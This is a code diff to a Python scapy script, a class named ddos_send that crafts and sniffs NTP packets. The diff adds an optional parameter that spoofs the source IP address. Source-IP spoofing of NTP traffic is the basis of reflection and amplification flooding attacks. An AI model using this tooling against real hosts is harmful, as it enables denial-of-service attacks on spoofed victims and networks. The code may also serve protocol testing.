@@ -8,11 +8,13 @@ from scapy.all import *
 """
 
 class ddos_send(object):
-    def __init__(self, port, dst):
+    def __init__(self, port, dst, sip = None):
 
         self.port = port
         self.dst = dst
         self.smac, self.src = self.get_mac_and_ip(self.port)
+        if sip:
+            self.src = sip
 
     def get_mac_and_ip(self, port):
         if port == "lo":
@@ -59,8 +61,7 @@ class ddos_send(object):
         p = IP(src = self.src, dst = self.dst)/UDP()/NTP(**data)
         res = sr1(p, inter=0.1, timeout = 0.5)
         return res
-
-
+    
     def reply_ntp_packet(self, data):
         pkts = sniff(iface=self.port, count = 1,filter="udp and dst port 123 and ip src %s"%self.dst)
         pkt = pkts[0]
